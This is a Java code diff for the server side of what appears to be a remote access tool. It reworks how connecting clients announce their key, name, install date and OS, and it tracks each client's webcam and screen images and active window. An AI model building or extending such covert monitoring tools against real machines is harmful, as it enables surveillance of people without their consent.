@@ -120,8 +120,13 @@ public class ClientHandler implements Runnable {
             String command;
             while ((command = reader.readLine()) != null) {
                 ConnectServer.addBytes(command.length(), false);
-                if (command.startsWith("key:")) {
-                    clientKey = command.replace("key:", "");
+                if (command.startsWith("connect:")) {
+                    String info = command.replace("connect:", "");
+                    String[] args = info.split("\\|");
+                    clientKey = args[0];
+                    clientName = args[1];
+                    installDate = args[2];
+                    os = args[3];
                     if (ConnectServer.CONNECTED_KEYS.contains(clientKey)) {
                         if (ConnectServer.DISCONNECT_DUPLICATE) {
                             clientSocket.close();
@@ -130,19 +135,6 @@ public class ClientHandler implements Runnable {
                     }
                     loaded = true;
                     ConnectServer.CONNECTED_KEYS.add(clientKey);
-                } else if (command.startsWith("user:")) {
-                    clientName = command.replace("user:", "");
-                    ConnectServer.msg("Conexão com cliente " + getClientInfo() + " estabelecida!");
-                    auth = true;
-                    ServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
-                    ServerAudioComponents.generateBeep(100, 1500, true);
-                } else if (command.startsWith("date:")) {
-                    installDate = command.replace("date:", "");
-                } else if (command.startsWith("os:")) {
-                    os = command.replace("os:", "");
-                } else if (command.equalsIgnoreCase("rping")) {
-                    pingTest = System.currentTimeMillis();
-                    send("r-ping");
                 } else if (command.startsWith("updateinfo ")) {
                     String[] args = command.split(" ", 4);
                     screens = Integer.parseInt(args[1]);
@@ -152,6 +144,8 @@ public class ClientHandler implements Runnable {
                         continue;
                     }
                     ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                    pingTest = System.currentTimeMillis();
+                    send("r-ping");
                 } else if (command.equalsIgnoreCase("icon-screen") || command.equalsIgnoreCase("icon-webcam")) {
                     boolean webcam = command.equalsIgnoreCase("icon-webcam");
                     ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
